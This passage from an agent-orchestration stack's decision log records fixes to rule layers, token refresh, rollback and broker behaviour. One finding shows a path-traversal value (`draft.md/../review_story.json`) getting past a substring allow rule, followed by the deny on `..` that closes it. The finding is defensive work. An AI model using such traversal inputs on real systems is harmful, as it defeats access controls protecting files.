(`nv2move3`, novel-arc on the seeded store, MLflow `dcefcd4b…`). All three external packages are
now on the current contract — devflow (§87), trading (§89–§92), novel-v2 — and #50's checklist is
complete. Three findings came back, each with a measurement, and one more on #44.

**#77 — an allow with `condition_type: cel` and an empty expression matches nothing.** Preloop's
rule layer: under `simple` an empty expression is "anything else" (every catch-all deny in this
tree), under `cel` it is an empty program. The author's Search allow written that way fell to
approval on every request until the step timed out (600 s, `reject_once`). The stack's:
`principals.rule_problems()` names such a rule, and `apply` refuses the declaration with the
sentence instead of Preloop accepting it quietly; the header of `config/principals.yaml` and
docs/packages.md "Identities" say it.

**#78 — `contains()` is a substring, and the rule layer does no path normalization.** Measured on
Preloop's own condition-test endpoint: `args.path.contains('draft.md')` is true of
`draft.md/../review_story.json`; `endsWith`/`matches` refuse every variant (7/7). The in-tree
examples (hello-lane, novel) use `contains`. Not the stack's to normalize — the rule runs in
Preloop — but the stack owns the account policy: `policy/b-fsmcp.yaml` now denies `..` in the
path of every write, edit, create and move for every principal, so the traversal row is closed
category-wide; the substring rows are the rule author's, and the page says how (name the file by
its end, keep the catch-all deny). The in-tree example rules are left as they are: `simple`
rules' support for `endsWith` is not measured here, and the policy covers the row that matters.

**#79 — how a role gets web tools was on no page, and a profile yaml that was never generated ran
as an empty profile.** The switch is the execution profile's `tools.native_allow` (WebSearch,
WebFetch; `routed: profile_native_allow`), WebFetch's hosts are the egress profile's at the proxy,
WebSearch runs at the provider — written on docs/packages.md "Identities" now. The second half
was the stack's defect: `agent_task.py` (and `broker_dispatch.py`, for the timeout) took
`settings.profile(name) or {}`, so a profile yaml written after the last `cfg.py generate` ran
with `native_allow: []`, every Search waited for a person, and three runs timed out before the
author read the adapter's source. The door now refuses a profile with no generated file,
naming `cfg.py generate` and the profiles that exist — the same refusal admission and the
runner already made. `roles.py` and `record.py` keep the empty fallback: the first only reads
routing tables (and binds nothing from an empty one), the second must not fail a run over its
record.

**#44 — the hold clears with one call inside the container, through the proxy** (novel-v2's
measurement, 2026-09-28): `HTTPS_PROXY=http://egress:8888 CLAUDE_CONFIG_DIR=/route/claude claude
-p 'say OK'` refreshes the token because `console.anthropic.com` is on the shared allowlist;
without the proxy variables the call hangs. That is candidate (a) of §88, measured: a model call
made for no work. The stack does not make it (decision 2 stands); the runbook's expired-login
entry now carries it as the operator's manual remedy, and says the org-disabled variant answers
that call with the real remedy's sentence.

**Measured.** review_controls' new group on `rule_problems` (the refused shape, the two fine
shapes, no rules); trial_controls' query group +1 (a profile with no generated file: FAILED,
attempts 0, no call, `cfg.py generate` and the existing names in the sentence); `verify.sh
--level static`'s policy check now also asks that every write tool denies `..`. Pins at the
ratchets; **cold-start run 118 green** on 1959d8b (the policy with the new conditions `"applied"`
on a fresh Preloop). Not measured here: the policy's new conditions on a live Preloop (the cold start
applies the policy — `"applied"` is its acceptance; the denial itself is one write with `..` on
the instance, the author's probe endpoint will do).

## 97. A policy change is applied on every bring-up, and `--check` says when it is not (#78 follow-up, 2026-10-04)

**Measured by novel-v2 on its instance, updated to e929362 (not a cold start):** the first `..`
write probe reached the filesystem — the §96 denies were not on that Preloop yet — and only after
`cfg.py apply` by hand did the account answer `Access denied: no traversal in a write path (#78)`.
Read against `scripts/up.sh`: the policy was applied on the claim, and again when the runtime's
tool probe failed (§28's heal); a plain bring-up of a claimed instance with a changed `policy/`
applied nothing, and no check line said so. `release.sh update` applies it after its own bring-up
(`reapply_policy`), which is why the operator's updates never showed this; an instance moved by
`git pull` and `up.sh` did.

**What changed.** `up.sh` applies the policy on every bring-up of a claimed instance (the `else`
of the claim branch; `cfg.py apply` answers "already applied" when the account carries this
content and the servers are there, so it is one question); `up.sh --check` has a line, `the
account enforces this checkout's policy`, read from `cfg.py status` (`applied`, or
`changed_since_apply` / `replaced` / `unknown` / `apply_failed`), and the cold start's judge
requires it. docs/update-day.md says a policy change rides with any bring-up.

**Measured.** trial_controls' bootstrap and review-findings groups 30/30 here (the claim-time
apply and the apply-before-rescan order unchanged); `verify.sh --level static` 13/13; the check's
command run on this checkout's generated state; **cold-start run 120 green** on 65aaa5b, the new
check line `ok` on the fresh claim and required by the judge. The cold start measures the line on
a fresh claim; the case it was written for — an instance brought up on a checkout whose policy moved —
is the next policy change on a live instance brought up by `up.sh`, read in that line.

## 98. `pin_kinds.py` reads a package's `assert` controls too (novel-v2's note on #50, 2026-10-04)

docs/packages.md said `pin_kinds.py classifies any controls file`; the tool counted only the
stack's own `check(name, …)` calls, so novel-v2's controls, written with `assert`, read
`checks: 0` — a classifier-compatibility question the author left on its own issue rather than
filing. The page over-promised, so the tool now does what it said: an `assert` statement is a
check (its message is the name when it has one, else its test), classified by the same rule —
a test that reads a repository file is `source-text`, a `not in` of one `absence`, the rest
`behaviour`. The stack's own two suites hold no asserts, so their counts and the ratchets (51 /
167) are unchanged. The page says what the tool reads, and that anything else is `checks: 0`.

**Measured.** review_controls 255/255 — a controls file of three asserts and one `check`
classifies 4 (one source-text, two behaviour, one absence) and lists the assert's message by
name; `verify.sh --level static` 13/13; **cold-start run 122 green** on ac13811. On the instance,
novel-v2's controls read `checks: 2, behaviour: 2` where they read 0 (its author notes a helper
under another name — `ok(...)` — is still not a check to the tool; the page says as much).

## 99. A controls file names its own check helper, and `pin_kinds.py` reads it (2026-10-04)

§98 made an `assert` a check to the tool; novel-v2's controls are mostly calls of a helper of
their own, `ok(name, cond)` — 131 of them — which the tool still did not see (`checks: 2`,
the two asserts). The question the author left: should the tool read that style? Three ways:
leave it (the page is honest, the package rewrites 131 lines or goes without); guess from a
call's shape (a string constant first — `print("…", x)` would count, a wrong number); or let the
file say. The third: a line of its own, `# pin_kinds: check=ok` (several names, comma-separated),
and calls of that name are read exactly like `check` — the condition's reads decide the kind.
Nothing is guessed: an undeclared helper is not a check, `checks: 0`, and the page says both.

**Measured.** review_controls 257/257: the same file undeclared reads 0; declared, its two
`ok(...)` calls read as one source-text and one behaviour, and `print("…", True)` never counts.
The stack's own suites' counts and ratchets unchanged (51 / 167). `verify.sh --level static`
13/13; **cold-start run 125 green** on fe9b6d6.

## 100. The expired login, measured live; §88 closed (#44, 2026-10-04, night)

The operator took the live instance 6c354af → 0b2c037 while claude's OAuth token was expired —
`expiresAt` 08:56:49Z, fourteen hours gone, the last good reading 56,265 s old — which is the
one condition §88 was built for and could not measure until it happened again. Both open items
of §88 are answered.

**What §88 said would happen, happened, word for word.**
- `up.sh --check`: `claude: unknown: the login's token expired — the last reading is 56265s old
  (> 1800s) and nothing here refreshes it; sign in on the panel`; `FAIL  every provider's state
  is knowable   expected 0, got 1`.
- `/api/accounts`: claude `connection: connected`, `login_expired: true`, `eligible: false` —
  the row the 계정 tab renders as `연결됨 · 토큰 만료` (hub/index.html, read against the
  payload; the screen itself was not photographed). codex and grok eligible.
- A run that needs claude holds, and only a person signing in clears it.

**Candidate (c) is out: CodexBar's `--source cli` refreshes nothing.** The one command §88
left to measure, run on the instance with the token expired:

```
CLAUDE_CONFIG_DIR=/route/claude HTTPS_PROXY=http://egress:8888 codexbar usage --provider claude --source cli --json
→ [{"provider":"claude","source":"cli","error":{"message":"Could not parse Claude usage: Missing Current session.","kind":"provider","code":1}}]
/route/claude/.credentials.json   before: 2026-10-04 00:56:49, sha 39680e52…   after: identical
```

It does not launch the CLI's refresh; it reads a session that is not there and says so. So of
the three ways §88 read, (a) a model call for no work is the only automatic one (measured by
novel-v2, §96, as the operator's manual remedy), and the operator keeps **decision 2: the stack
does not refresh a person's login**. #44 closes on that: candidates 2 and 3 are in (§88), the
refresh is a person's or a deliberate call's, never the collector's. The runbook's expired-login
entry now says `--source cli` is not a remedy.

**The hand-over's fourth measurement, and an exit code read right.** `release.sh update --to
0b2c037`: `recording release 20261004-225705-6c354af` (the rollback point, named after the
release in use), `performed by  the target revision's scripts/release.sh (0b2c037)`, `handed over
by  the script of 6c354af (candidate built, release in use kept)`, `now at  0b2c037`; images
rebuilt, containers recreated, 19 up, no `cand-` left, root certificates unchanged — and **exit
1**, because the update's checks are the bring-up's and the bring-up fails on a provider it
cannot determine (§88, by design). Every step was done; the script's words were "the checks did
not pass after the update. Go back with: rollback" — a prescription a rollback cannot fill, since
the previous release fails the same check on the same login. Now the message reads the kind: a
check the update cannot have caused (the expired login) is the panel's to fix and a rollback will
not pass it; anything else is the rollback's. `docs/update-day.md` carries the same sentence.
No control pins that text (it is a sentence to a person, read on the terminal), and the exit
code is unchanged: an update that ends with a provider nobody can determine still says 1.

**Measured.** On the instance, by the operator, evidence `evidence/m88-*` there: the token's
`expiresAt`, the check line, the API row, the `--source cli` answer, the credentials file's hash
before and after. Here: `bash -n scripts/release.sh`; `verify.sh --level static` 13/13; pins at
the ratchets (51 / 167); **cold-start run 127 green** on d8517e2. The other half, on the instance
after the operator signed claude in again on the hub (2026-10-05T00:16:52Z, live at 007422d):
`up.sh --check` → `ok    claude /route login  true`, `ok    every provider's state is knowable
0`, `ok    the router can choose a provider  yes`, ALL CHECKS PASSED, exit 0 — the hold clears
the way §88 said it would, by a person, and nothing else needed touching.

## 101. An instance's Python libraries are its own, and a rollback is two recoveries (2026-10-05)

The devflow session needed a PDF reader in the agent container and read the way there as "a stack
update": pydantic and httpx, trading's, sat in `docker/agent.Dockerfile` because the only way a
library reached the image was a line in the stack's code, by the stack owner, and a release. The
operator's objection was the right one — a package's library is not the stack's business — and
the reviewer's five points shaped the change: ownership and git are separate choices; a record
must say what was resolved; the manifest should be able to name the line without writing it; every
build and recovery path must carry the file, absence included; the shared venv's conflicts are
real and the import name is not the distribution name. Reading the rollback for the fourth point
found the larger thing: `release.sh rollback` retagged the kept images and then ran `up.sh
--recreate`, which always `--build`s — the tag just restored was overwritten by a rebuild of the
checked-out revision plus whatever untracked files the tree held, byte-identical only while the
build cache said so. The kept image was a warm cache; the recovery was from configuration, under
the name of the other.

**What changed.**
- `docker/python/stack.txt` (tracked) is the stack's own venv list, applied again as the
  constraints; `docker/python/python.local` (git-ignored, absent on a fresh clone) is the
  instance's — the libraries its packages declare, pinned `==`, approved by the operator by
  writing them there. The Dockerfile copies the directory and installs both in one resolve, so a
  local line that would move a stack pin fails the build with the conflict named; `pip freeze`
  is left in the image (`/opt/python/freeze.txt`). pydantic and httpx stay in stack.txt until the
  instances that run trading carry them in python.local — trading's follow-up.
- `scripts/up.sh`: a line without `==` fails the bring-up before any build (`python_local_report`:
  `none`, `pinned`, or the line and its number); `--check` has the line; `--no-build` brings up the
  images that exist and builds nothing.
- `scripts/release.sh`: record format 4 — `docker/python/python.local` and
  `docker/egress/allow.local` are members when present, `python.freeze` is kept beside the images;
  the update's candidate is built with the local file copied into the worktree, as the certificate
  is. **Rollback is now two recoveries**: the kept images come up with `--no-build` and every
  container's running image id is checked against the record (`running the release's kept image`,
  or exit 1 naming both ids); the configuration restored — `config/`, `policy/`, and from a
  format-4 record the two inputs, removed first so their absence is restored too — is what the
  next bring-up rebuilds from. A format-3 record leaves the inputs as they are and says so. The
  ids are read before the checks are judged (a dead login says nothing about which image came
  up), and a rollback whose checks fail says, as an update does since §100, that the kept images
  are up and which failure is not the release's.
  Found by the cold start, the first rollback ever run anywhere but the live instance: its
  `rm -rf config/generated` cannot unlink what the containers wrote as uid 1000 when the host's
  user is not 1000 (the runner's is not; the operator's is) — now a container removes it when
  the host cannot (`remove_generated`).
- `scripts/backup.sh` / `restore.sh`: the two inputs are a member (`instance-inputs.tar.gz`),
  restored where the build and the proxy read them. allow.local was in no backup before.
- `stack/packages.py`: `requires.python` takes `{import: <module>, dist: "<distribution>==<v>"}`
  beside a plain name; `packages.py python` prints `MISSING — put `<dist>` in
  docker/python/python.local and run scripts/up.sh --recreate`, the candidate lines under the
  table, `--candidates` only the lines; an open `dist` is printed with the ask to pin it; a module
  with no `dist` is asked for as "the distribution that provides it" — no name is guessed from an
  import name (yaml is PyYAML). `run_workflow.py start`'s refusal says the same and carries
  `where` per module.
- Docs: packages.md (the instance's list, one compatible set per instance, the manifest's `dist`,
  the file beside allow.local), update-day.md (two recoveries), commands.md.

**Not changed, and why.** No hash-verified lock: wheel hashes differ by architecture (trading's
Mac is arm64, this instance x86_64), pip-tools would enter the host toolchain, and every release
keeps its image, which is the strongest lock there is — `python.freeze` makes it readable. No
per-package venv: one instance runs one compatible set, the build says when two lines disagree,
and the operator settles it in the file. No automatic install from the manifest: the manifest
names the line, the operator writes it; approval is the file.

**Measured.** review_controls 268/268 — the new group runs the shell functions on temporary files
(`python_local_report`: none / pinned / `line 2 is not pinned: pypdf>=6`, an include refused;
`instance_inputs_present`, `restore_instance_inputs` 3 keeps and 4 removes; backup's
`instance_inputs`) and the loader on a temporary root (a plain name and an `{import, dist}` entry,
pinned and open; the three hints; the table with candidates and `--candidates`); the update
group's pin moved to `format=4`. Pins at the ratchets (51 / 167): the two shell-function checks
first read as source-text because the variable holding up.sh's text was named `up` and the
condition's string `up.sh --recreate` matched it on a word boundary — renamed, not re-counted.
`verify.sh --level static` 13/13; `bash -n` on the four scripts. The cold start now writes
`pypdf==6.19.0` into python.local before the build, reads it back from the image and from
`freeze.txt`, sees the `--check` line, records a release (`instance inputs
docker/python/python.local`, `python.freeze`), deletes the file, rolls back, and requires `as
recorded, absence included`, `running the release's kept image`, the file back and pypdf
importable — the first measurement of a rollback that brings up what it says it does. **Cold-start
run 135 green** on 99f0439: `instance inputs  docker/python/python.local`, `python  20 resolved
versions (python.freeze)`, `as recorded, absence included`, six services `running the release's
kept image`, the five login checks the only FAIL lines. Four red runs before it, each a finding:
131, the pipe carrying `up.sh --check`'s exit code with the three image measurements passed; 132,
two trial pins (the literal `up -d --build` line, the refusal block within 900 characters); 133,
rollback's `rm` of `config/generated` on a host whose user is not uid 1000; 134, the rollback
exiting 1 on the runner's five login checks before the image ids were read — now read first,
and the rollback's FAIL lines judged as the install's are.

## 102. The query kind goes: a contract violation, corrected (2026-10-06)

The devflow session had moved its code-review lenses to the query kind on the operator's word and
found them unable to read the repository; its analysis of why ended at the right place — "the
stack's `query` bundles no-tools-one-shot with schema-validated output, and the two are
independent" — and the operator's question went one step further: whose business is the bundle?
Read against CONTRACT.md the answer is nobody's on this side. The stack provides capabilities and
the workflow decides how they are used; §89 took trading's use of one capability (a prompt
answered with no tools, in a declared shape) and made the use a **kind** of call, with the
stack deciding that a schema means no tools and no tools means a schema. devflow followed the
definition the docs gave and got a judge where it needed a reader. DECISIONS-2026-10-04 §8 is
where the bundling was decided; it was my design, not trading's ask — #62 asked for a stdin
payload, the vendor's envelope and a per-call schema, all input/output shape.

**The two axes, and where each lives now.**
- **The environment is the profile's** (and the principal's and the egress profile's, as it
  was). One key is new: `tools.allowed`, the list the vendor's agent is handed as its tools —
  the adapter's session option `allowedTools`, which until now only `--query` set, and which no
  profile key reached. `tools.allowed: []` is a **closed call**: no tools, one turn (`maxTurns:
  1`), no Preloop MCP server, every permission request refused by the adapter without asking —
  everything the query did on the environment side, read from the profile the call names. The
  tracked profile `closed` is that environment. Only `[]` is accepted (`cfg.py validate`
  refuses a named list): it is the measured case, and which calls an open call's tools may make
  is the principal's `tool_rules`. The record says `closed`.
- **The output contract is `--output-schema <schema.json>`** on `agent_task.py`, on any call.
  The answer is the expected file when this attempt wrote it (a call with tools that writes its
  answer), else the model's text with one fence removed (a closed call); read as JSON, checked
  here against the schema; `INVALID_OUTPUT` with every break named and no retry, as before; with
  a schema, `produced` means a valid answer arrived. A written file that breaks the schema is
  left as the model wrote it and `produced` is false — a chain does not advance on it.
- **`--query` is gone**, with no alias: the operator decided that a combination the stack names
  is the same violation in a smaller font, and trading re-declares its calls as the `closed`
  profile plus `--output-schema` at its next re-qualification. The record's `kind` is gone;
  `closed` replaces it; `contract` is **3**. The prompt may be `-` (stdin) on any call, and
  `{WS}` is replaced where it appears — the query's "byte for byte" was a distinction without a
  difference once the record carries the prompt the model saw. A chain step says `schema:`,
  `model:` and a `profile:` of its own instead of `query:`.
- What did not change: the validator (`stack/query.py`), the refusal of a half-read schema before
  the call, the two verdicts, the one retry for a cut stream (now: with a schema and no file
  written), the broker carrying schema and model (§91) — the environment now travels as the
  profile's name, which it always did.

**Measured.** trial_controls' shape group, run here against a `/work` link with the generated
profiles and the stand-in adapter (31/31): the closed profile with a schema (valid, fenced,
invalid, TOOLS_USED, the cut-stream retry, stdin with `{WS}` replaced, the three schema refusals,
the ungenerated profile), an open profile without a schema (not closed, tool calls counted and
allowed, no `allowed_tools` on the request), an open profile with a schema (a written file
judged — valid produced, invalid left as written with `produced: false` — and a text answer
written by the door), the closed profile without a schema, `--model`, and the brokered job
carrying prompt, schema, model and the profile's name. review_controls 269/269: the record's keys
(`closed`, no `kind`, contract 3), the option parser (`--query` read as a positional now), the
adapter's local refusal (`closed_no_tools`); the providers' `closedEnv` 24/24; pins at the
ratchets (51 / 167); `cfg.py validate` accepts `closed` and refuses a named `tools.allowed`;
`verify.sh --level static` 13/13. **Cold-start run 138 green** on 87b4e8f — the same group in
the container 546/546 at the stack level, 24/24; run 137 red on one trial pin that still read
contract 2.

## 103. devflow's three findings after §102: a half-updated path, a bound nobody stated, a refusal nobody heard (#88, #89, #91, 2026-10-06)

devflow moved to §102 the hour it merged (`requires.stack.min: 826536e`: three investigators on
`research-default`, one judge on `closed`, every member with `--output-schema`) and filed three
findings, two of them from the day before. All three are the stack's.

**#91 — after `git pull` + `up.sh`, the broker and the runners ran §102-before code.** The broker
and the profile runners (and the replay server) run `/work/stack/*.py` as long-lived processes
from the bind mount; `compose up -d --build` recreates a container only when its image changed,
and a change in `stack/` changes no image. So the operator's bring-up generated `closed.json`
and left the servers on the code they had started with on 10-05. The old runner handed the new
door `--query sf`; the new door read `--query` as a positional and dropped it; the judge, closed
and without a schema, answered into nothing — `COMPLETED`, `schema_sha256: ""`, `produced:
false`, `failure: ""`, twice. Nothing on the path said a word. Two things now do:
- `scripts/up.sh` names the stack servers whose process started before the newest Python file
  under `stack/` (`stack/stale_servers.py`, docker's `StartedAt` against the mtimes, run inside
  the agent container so no host python is needed) and **restarts them on every bring-up**
  (`== stack servers started before this code — restarting: …`); `--check` fails `the stack's
  servers run this checkout's code (broker, runners)` naming them. A brokered call running on a
  restarted server ends with the process: a bring-up is the operator's moment for that, and the
  docs say so (update-day.md, runbook).
- `broker_dispatch.py` sent the schema, so it knows what a completed record must name: one
  whose `schema_sha256` is not the hash of what it sent is `FAILED` with "the runner did not
  apply the output schema this call was given … a runner whose process predates the checkout",
  `produced: false`, the answer emptied — never a completed call with an empty answer.

**#88 — a brokered prompt is bounded at 200,000 characters, and no page said so.** The runner
refused `len(prompt) > 200000` with "prompt text is required (and bounded)" and no evidence
directory; a direct call has no bound. The bound is now one name (`execution.PROMPT_BOUND`),
read by the dispatch step, the broker and the runner; **the dispatch step refuses before the
hand-over** (`FAILED`, `attempts: 0`, "the prompt is 369,809 characters and the schema 1,204; a
brokered call carries each as text in its job, bounded at 200,000 … a direct call has no bound;
split the call, or hand the materials over as files the role reads"); docs/packages.md states
it beside "Where it runs". The schema is bounded the same way (the broker truncated it silently
before).

**#89 — the broker reported a runner's 400 as `did not answer: HTTPError`, and the member retried
it.** `broker.runner_answer()` now carries a runner's 4xx in the runner's words with the code as
`refused`; the dispatch step records it as **`REFUSED`**, `attempts: 0`, the words in `failure`;
`tasks.py` reads `REFUSED` as a member's `denied` — the same request is refused the same way, so
a default `retry_when` does not run it again. A 5xx stays a failure; nothing answering stays
`did not answer: <kind>`.

**Measured.** review_controls 277/277 — `stale_servers.stale()` on a temporary tree (a process
before the newest file under `tools/` is stale, a later one is not, odd lines are skipped;
docker's nanosecond timestamp read to the second); `broker.runner_answer()` against local HTTP
servers (200 passed through, 400 with its words and `refused: 400`, 413 with no JSON body, 503 a
failure, nothing listening `did not answer: URLError`); `outcome_of`: REFUSED → `denied`.
trial_controls' shape group, run here against the `/work` link (34/34): the brokered recorder
answering with the schema named (passed through), without it (FAILED, the stale-runner
sentence), with a 400 (REFUSED, attempts 0, the runner's words), and a prompt of 200,001
characters refused before the broker was asked. Pins at the ratchets (51 / 167); `verify.sh
--level static` 13/13. The cold start touches `stack/profile_runner.py` after the install and
requires `--check` to fail the servers check, the next `up.sh` to print the restart line, and the
check to pass after.
